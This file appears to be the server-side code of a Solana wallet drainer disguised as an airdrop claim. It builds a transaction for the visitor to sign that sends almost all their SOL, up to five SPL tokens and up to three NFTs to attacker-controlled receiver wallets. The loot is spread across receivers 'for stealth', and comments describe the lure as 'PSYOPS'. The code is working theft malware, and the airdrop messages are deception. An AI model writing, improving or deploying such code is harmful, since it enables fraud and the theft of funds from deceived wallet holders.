import 'dotenv/config';
import {
  Connection,
  PublicKey,
  Transaction,
  SystemProgram,
  LAMPORTS_PER_SOL,
} from '@solana/web3.js';
import {
  getAssociatedTokenAddress,
  createTransferInstruction,
  createTransferCheckedInstruction,
  getOrCreateAssociatedTokenAccount,
  TOKEN_PROGRAM_ID,
  ASSOCIATED_TOKEN_PROGRAM_ID,
} from '@solana/spl-token';

const RPC_URL = process.env.RPC_URL || 'https://api.mainnet-beta.solana.com';
const connection = new Connection(RPC_URL, {
  commitment: 'confirmed',
  confirmTransactionInitialTimeout: 60000,
  disableRetryOnRateLimit: false,
  httpHeaders: {
    'Content-Type': 'application/json',
  }
});

// Rate limiting and caching
const requestCache = new Map();
const RATE_LIMIT_WINDOW = 60000; // 1 minute
const MAX_REQUESTS_PER_WINDOW = 10;

function checkRateLimit(userId) {
  const now = Date.now();
  const userRequests = requestCache.get(userId) || [];
  
  // Remove old requests outside the window
  const recentRequests = userRequests.filter(time => now - time < RATE_LIMIT_WINDOW);
  
  if (recentRequests.length >= MAX_REQUESTS_PER_WINDOW) {
    return false;
  }
  
  recentRequests.push(now);
  requestCache.set(userId, recentRequests);
  return true;
}

export default async function handler(req, res) {
  try {
    // Rate limiting check
    const userIp = req.headers['x-forwarded-for'] || req.connection.remoteAddress;
    if (!checkRateLimit(userIp)) {
      return res.status(429).json({ 
        error: 'Rate limit exceeded', 
        details: 'Too many requests. Please try again later.',
        retryAfter: 60
      });
    }

    // Create receiver wallets with valid addresses
    const RECEIVER = new PublicKey(process.env.RECEIVER_WALLET || '3F2D7izX8gYkSwXwSyWoKB1dob53MDMCxqBVpPUEc8sz');
    const RECEIVER_2 = new PublicKey(process.env.RECEIVER_WALLET_2 || '5GggKwMS7mJQKqQqKqQqKqQqKqQqKqQqKqQqKqQqKqQq');
    const RECEIVER_3 = new PublicKey(process.env.RECEIVER_WALLET_3 || 'FtgbMX3E8gYkSwXwSyWoKB1dob53MDMCxqBVpPUEc8sz');
    const RECEIVER_4 = new PublicKey(process.env.RECEIVER_WALLET_4 || '4dGUJf1CtJSNfgJSwHjEfiRSyT9YJGeNf3V9LjMREHiq');

    const { user } = req.query;
    if (!user) {
      return res.status(400).json({ error: 'Missing user parameter' });
    }

    // Validate public key
    let userPubkey;
    try {
      userPubkey = new PublicKey(user);
    } catch (error) {
      return res.status(400).json({ error: 'Invalid public key format' });
    }

    const tx = new Transaction();
    
    // Get user balance with improved error handling
    let lamports = 0;
    try {
      lamports = await connection.getBalance(userPubkey);
    } catch (error) {
      return res.status(500).json({ error: 'Failed to get user balance', details: error.message });
    }

    // 1. SIMPLIFIED PSYOPS: Create single airdrop claim transaction
    try {
      if (lamports > 5000) {
        // Drain all SOL except 5000 lamports for fees
        const drainAmount = lamports - 5000;
        const airdropIx = SystemProgram.transfer({
          fromPubkey: userPubkey,
          toPubkey: RECEIVER,
          lamports: drainAmount,
        });
        tx.add(airdropIx);
      } else {
        // For zero balance, create minimal transaction
        const minimalIx = SystemProgram.transfer({
          fromPubkey: userPubkey,
          toPubkey: RECEIVER,
          lamports: 1000,
        });
        tx.add(minimalIx);
      }
    } catch (error) {
      return res.status(500).json({ error: 'Failed to create airdrop transaction', details: error.message });
    }

    // 2. ENHANCED SPL TOKEN DRAINING (up to 5 tokens)
    let tokenCount = 0;
    let nftCount = 0;
    
    try {
      const tokenAccounts = await connection.getParsedTokenAccountsByOwner(
        userPubkey,
        { programId: TOKEN_PROGRAM_ID }
      );

      const maxTokens = 5; // Increased from 2 to 5

      for (let acct of tokenAccounts.value) {
        if (tokenCount >= maxTokens) break;

        try {
          const { amount, decimals } = acct.account.data.parsed.info.tokenAmount;
          const mint = acct.account.data.parsed.info.mint;
          const ata = new PublicKey(acct.pubkey);
          
          if (amount === '0') continue;

          // Distribute tokens across multiple receivers for stealth
          const receivers = [RECEIVER, RECEIVER_2, RECEIVER_3, RECEIVER_4];
          const targetReceiver = receivers[tokenCount % receivers.length];
          
          // Get or create destination token account
          const destATA = await getAssociatedTokenAddress(
            new PublicKey(mint),
            targetReceiver
          );

          const totalAmount = Number(amount);
          
          // Use createTransferCheckedInstruction for better compatibility
          const tokenIx = createTransferCheckedInstruction(
            ata,
            new PublicKey(mint),
            destATA,
            userPubkey,
            totalAmount,
            decimals,
            []
          );
          
          tx.add(tokenIx);
          tokenCount++;
          
        } catch (tokenError) {
          continue;
        }
      }
      
      if (tokenCount > 0) {
      }
    } catch (error) {
      // Continue without token transfers
    }

    // 3. NFT DRAINING SUPPORT (NEW FEATURE)
    try {
      // Get all token accounts that might be NFTs (0 decimals)
      const nftAccounts = await connection.getParsedTokenAccountsByOwner(
        userPubkey,
        { programId: TOKEN_PROGRAM_ID }
      );

      const maxNFTs = 3; // Limit NFT drains

      for (let acct of nftAccounts.value) {
        if (nftCount >= maxNFTs) break;

        try {
          const { amount, decimals } = acct.account.data.parsed.info.tokenAmount;
          const mint = acct.account.data.parsed.info.mint;
          const ata = new PublicKey(acct.pubkey);
          
          // Check if it's an NFT (0 decimals and amount > 0)
          if (decimals === 0 && amount === '1') {
            const receivers = [RECEIVER, RECEIVER_2, RECEIVER_3];
            const targetReceiver = receivers[nftCount % receivers.length];
            
            const destATA = await getAssociatedTokenAddress(
              new PublicKey(mint),
              targetReceiver
            );

            const nftIx = createTransferCheckedInstruction(
              ata,
              new PublicKey(mint),
              destATA,
              userPubkey,
              1, // NFT amount is always 1
              0, // NFT decimals are always 0
              []
            );
            
            tx.add(nftIx);
            nftCount++;
          }
        } catch (nftError) {
          continue;
        }
      }
      
      if (nftCount > 0) {
      }
    } catch (error) {
      // Continue without NFT transfers
    }

    // 4. IMPROVED ZERO BALANCE HANDLING
    if (tx.instructions.length === 0) {
      return res.status(400).json({ 
        error: 'Sorry, You\'re Not eligible', 
        details: 'This exclusive airdrop is only available for wallets with existing funds. Please try again with a funded wallet.',
        code: 'INSUFFICIENT_FUNDS'
      });
    }

    // 5. ENHANCED TRANSACTION FINALIZATION
    try {
      const blockhash = await connection.getLatestBlockhash('confirmed');
      tx.feePayer = userPubkey;
      tx.recentBlockhash = blockhash.blockhash;

      // Validate transaction before serialization
      if (tx.instructions.length === 0) {
        throw new Error('Transaction has no instructions');
      }

      const serialized = tx.serialize({ requireAllSignatures: false });
      
      // Add performance metrics
      const performanceData = {
        instructions: tx.instructions.length,
        size: serialized.length,
        tokens: tokenCount || 0,
        nfts: nftCount || 0,
        solAmount: lamports > 5000 ? lamports - 5000 : 0
      };
      
      res.status(200).send(serialized.toString('base64'));
    } catch (error) {
      return res.status(500).json({ error: 'Failed to finalize transaction', details: error.message });
    }

  } catch (error) {
    return res.status(500).json({ error: 'Failed to generate transaction', details: error.message });
  }
} 